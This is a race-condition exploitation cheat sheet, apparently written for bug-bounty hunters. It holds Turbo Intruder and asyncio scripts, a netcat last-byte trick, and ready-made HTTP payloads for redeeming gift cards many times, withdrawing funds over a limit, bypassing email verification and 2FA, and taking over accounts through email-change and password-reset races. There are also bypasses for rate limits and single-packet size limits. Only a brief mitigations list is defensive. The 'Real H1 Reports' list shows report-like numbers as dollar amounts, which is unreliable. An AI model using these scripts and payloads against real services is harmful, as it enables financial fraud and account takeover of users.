## 🎯 Overview

**Race Condition** = Architecture vulnerability in multi-threaded apps where operation success depends on the **order/timing** of code execution.

When multiple threads access shared data simultaneously without proper synchronization → **collision** → unintended behavior you can exploit.

**Key concept**: Get requests to arrive at **nearly the same microsecond** (ideally <1ms apart) to bypass validation checks.

---

## 🔥 Exploitation Methods

### Method 1: HTTP/2 Single-Packet Attack (BEST)

**Requirements**: Target supports HTTP/2

**Steps**:

1. Send request to **Turbo Intruder** (Extensions → Turbo Intruder)
2. Mark value to test with `%s` (e.g., `csrf=token&email=%s`)
3. Select script: `examples/race-single-packet-attack.py`
4. For wordlist from clipboard:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    passwords = wordlists.clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**⚠️ If HTTP/1.1 only**: Use `Engine.THREADED` or `Engine.BURP` instead of `Engine.BURP2`

---

### Method 2: Burp Repeater Parallel Sending

**Steps**:

1. Send same request **50+ times** to Repeater
2. Create a **Group** tab with all requests
3. Right-click → **"Send group in parallel (single-packet attack)"**
4. Check responses for anomalies

**Pro tips**:

- Add **connection warming requests** at start (non-static endpoints)
- For multi-step exploits: insert requests between stages to delay processing
- Check for **negative timestamps** = server responded before request fully sent = TRUE RACE ✅

---

### Method 3: HTTP/1.1 Last-Byte Sync

**How it works**: Send 99% of request → pause → send final byte of ALL requests simultaneously

**Implementation**:

```bash
# Send incomplete request (missing final \n)
echo -ne "GET / HTTP/1.1\r\nHost: target.com\r\n\r" | nc target.com 80
# Server waits... now send last byte with others in batch
```

**Steps**:

1. Open 20-30 connections
2. Send headers + body minus **last byte**
3. Wait 100ms
4. Disable `TCP_NODELAY` (enables Nagle's algorithm)
5. Send ping to warm connection
6. Send all final bytes **together**

---

### Method 4: Advanced Multi-Endpoint RC

**Scenario**: Exploit chains multiple requests (e.g., product → cart → checkout)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: target.com
Cookie: sessionid=xyz
Content-Length: 0

'''

    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'user' + currentAttempt

        # Queue registration
        engine.queue(target.req, username, gate=currentAttempt)

        # Queue 50 confirmation requests
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)

        engine.openGate(currentAttempt)
```

---

### Method 5: Python asyncio Script

```python
import asyncio
import httpx

async def exploit(client):
    resp = await client.post('http://target.com/redeem', 
                             cookies={"session": "token"}, 
                             data={"code": "GIFT100"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = [asyncio.ensure_future(exploit(client)) for _ in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            print(r)

asyncio.run(main())
```

---

### Method 6: WebSocket Race Conditions

**Tool**: Burp WebSocket Turbo Intruder

```python
# Use THREADED engine for multiple WS connections
# Fire payloads in parallel across handlers
# Tune config() for thread count
```

**Java PoC**: [WS_RaceCondition_PoC](https://github.com/redrays-io/WS_RaceCondition_PoC)

---

## 🎪 Attack Scenarios

### Scenario 1: Limit-Overrun (TOCTOU)

**Target**: Actions with usage limits

- Redeem gift cards
- Apply discount codes
- Rate/vote on items
- Withdraw funds
- Use CAPTCHA tokens
- File uploads (trial limits)

**Steps**:

1. Find request with quantity/limit check
2. Send 50+ parallel requests
3. Check if limit bypassed

---

### Scenario 2: Hidden Substates

**Target**: Multi-step operations with database writes

**Example - Email Verification Bypass**:

```
Step 1: Username + password written to DB
Step 2: Verification token written to DB
↓
Small time window where token = NULL
```

**Exploit**:

1. Register account
2. Send 50 requests: `POST /confirm` with `token=` (empty)
3. Account confirmed without email access

**Payloads to try**:

- `token=`
- `token[]=`
- `token[]=&token[]=`
- `verification_code=`

---

### Scenario 3: Email Change → ATO

**Target**: Email update functions that send verification to new email

**Steps**:

1. Change email to `attacker@evil.com` (Request A)
2. Change email to `victim@real.com` (Request B)
3. Send **parallel** (single-packet attack)
4. Check `attacker@evil.com` inbox
5. If verification token for victim's email arrives → **ATO** ✅

---

### Scenario 4: Session-Based Locking Bypass

**Problem**: PHP's `session_start()` locks session file → blocks concurrent requests

**Solution**: Create multiple sessions

1. Login 30 times → collect 30 `PHPSESSID` values
2. Assign different session to each parallel request
3. Bypass session lock

---

### Scenario 5: 2FA Bypass

**Vulnerable code**:

```python
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True  # ← Race window here
    # generate MFA code
```

**Exploit**: Send login request + resource access request in parallel **before** `enforce_mfa` is set

---

### Scenario 6: Time-Sensitive Token Generation

**Target**: Password reset tokens generated via timestamp

**Steps**:

1. Request 2 password resets **simultaneously** (single-packet)
2. If tokens are **identical** → timestamp-based generation confirmed
3. Request reset for **your account** + **victim account** in parallel
4. Same token generated → **ATO**

---

### Scenario 7: OAuth Eternal Persistence

**Attack**: Abuse RC in OAuth provider to generate multiple AT/RT pairs

**Type A - Race in authorization_code**:

1. User authorizes your app
2. `authorization_code` issued
3. **Race**: Exchange code for **multiple** AT/RT pairs
4. User revokes app → only 1 pair deleted, others still valid

**Type B - Race in Refresh Token**:

1. Obtain valid RT
2. **Race**: Use RT to generate multiple new AT/RT pairs
3. User revokes app → only 1 RT deleted, others persist

---

### Scenario 8: Pay Once, Get Multiple Items

**Target**: E-commerce checkout flows

**Steps**:

1. Add item A to cart
2. Proceed to payment
3. **During payment processing**, send parallel requests to:
    - Add item B, C, D to cart
    - Finalize order
4. Payment processes once, multiple items delivered

---

## 🔧 Bypasses & Pro Tips

### Bypass 1: Rate Limiting

**Method**: Overwhelm server to trigger resource delays

1. Flood with **dummy requests** (non-target endpoints)
2. Server hits rate limit → processing slows down
3. Launch single-packet attack during slowdown
4. Requests arrive in **tighter window**

---

### Bypass 2: Server Architecture

**Problem**: Front-end load balancer distributes requests differently

**Solution**:

- Send **pre-warming requests** to non-static endpoints
- Establishes stable connection to backend
- Normalizes request timing

---

### Bypass 3: Proximity Advantage

**Host your attack closer to target**:

- Target on AWS → rent AWS instance
- Target on DigitalOcean → rent DO droplet
- **Ping matters**: 200ms vs 10ms = huge difference
- Bonus: Same physical server = even better timing

---

### Bypass 4: Connection Warming

**Before main attack**:

1. Send ping frame
2. Send 2-3 harmless requests
3. Disable `TCP_NODELAY`
4. Launch race attack

Stabilizes timing, reduces jitter.

---

### Bypass 5: Extend Single-Packet Limit

**Problem**: Single-packet attack limited to 1,500 bytes

**Solution**: IP layer fragmentation

- Split packet into **multiple IP fragments**
- Send in **different order**
- Server can't reassemble until all arrive
- **Limit extended to 65,535 bytes** (TCP window size)
- Can send **10,000 requests in ~166ms**

**⚠️ Server limits**: Apache/Nginx/Go limit concurrent streams (100-250), NodeJS/nghttp2 unlimited

**Tool**: [first-sequence-sync](https://github.com/Ry0taK/first-sequence-sync)

---

## 💣 10 Most Robust Payloads

### 1. Gift Card Multi-Redeem

```http
POST /api/redeem HTTP/2
Host: target.com
Content-Type: application/json

{"code":"GIFT100","amount":100}
```

**Send 50x parallel**

---

### 2. Email Verification Bypass

```http
POST /api/verify HTTP/2
Host: target.com

token=&email=victim@target.com
```

**Variations**: `token[]=`, `verification_code=`, `code=`

---

### 3. Discount Code Reuse

```http
POST /cart/apply-coupon HTTP/2
Host: target.com

coupon=SAVE50&cart_id=12345
```

---

### 4. Vote/Like Spam

```http
POST /api/vote HTTP/2
Host: target.com

post_id=999&vote=up
```

---

### 5. Withdraw Funds Over Limit

```http
POST /api/withdraw HTTP/2
Host: target.com
Content-Type: application/json

{"amount":1000,"account":"attacker"}
```

---

### 6. Email Change Race

```http
POST /account/email HTTP/2
Host: target.com

new_email=attacker@evil.com

# Then immediately parallel:
new_email=victim@real.com
```

---

### 7. Password Reset Token Race

```http
POST /reset-password HTTP/2
Host: target.com

email=attacker@evil.com

# Parallel with:
email=victim@target.com
```

---

### 8. Multi-Invite Bypass

```http
POST /team/invite HTTP/2
Host: target.com

email=friend@test.com&role=admin
```

**Send 20x to bypass 3-invite limit**

---

### 9. CTF Flag Multi-Submit

```http
POST /ctf/submit HTTP/2
Host: ctf.target.com

flag=HTB{race_me}&challenge_id=10
```

---

### 10. Retest Payment Duplicate

```http
POST /retest/confirm HTTP/2
Host: target.com

retest_id=555&confirm=true
```

**Get paid multiple times**

---

## 🎯 Higher Impact Scenarios

### 1. Full Account Takeover

- Email change race → verify victim email
- Password reset race → same token
- OAuth persistence → eternal access

### 2. Financial Loss

- Gift card multi-redeem
- Withdraw over balance
- Payment duplication
- Free premium features

### 3. Privilege Escalation

- Invite admin bypass
- Role assignment race
- Permission check bypass

### 4. Data Integrity

- Multi-submission (votes, reviews)
- Database corruption
- Inventory manipulation

---

## 🛡️ Mitigations (For Reporting)

1. **Implement proper locking mechanisms**
    
    - Database row-level locks
    - Distributed locks (Redis)
    - Transaction isolation
2. **Use idempotency keys**
    
    - Generate unique token per operation
    - Reject duplicate tokens
3. **Rate limiting per user session**
    
    - Not just IP-based
    - Track concurrent requests
4. **Atomic operations**
    
    - Use database transactions
    - ACID compliance
5. **Session locking**
    
    - Serialize requests per session
    - But be aware of bypass techniques

---

## 📚 Real H1 Reports

- **$759247** - Gift card multi-redeem (Reverb.com)
- **$454949** - CTF flag spam (HackerOne)
- **$1285538** - Team invite bypass (Omise)
- **$429026** - Retest payment duplicate (HackerOne)
- **$604534** - Un-deletable group member (HackerOne)
- **$927384** - Follow user multiple times (every.org)
- **$146845** - Upvote spam (HackerOne)
- **$115007** - Invitation limit bypass (KeyBase)

---

## 🔍 Detection Tips

**Look for negative timestamps in Turbo Intruder** = server responded before request fully sent = **CONFIRMED RACE**

**Check for**:

- Different response times with same input
- Inconsistent counter values
- Duplicate database entries
- Multiple success messages

**Test endpoints with**:

- File uploads
- Payment processing
- Email changes
- Password resets
- Voting/rating systems
- Coupon/gift card redemption
- Group/team invitations
- Follow/like actions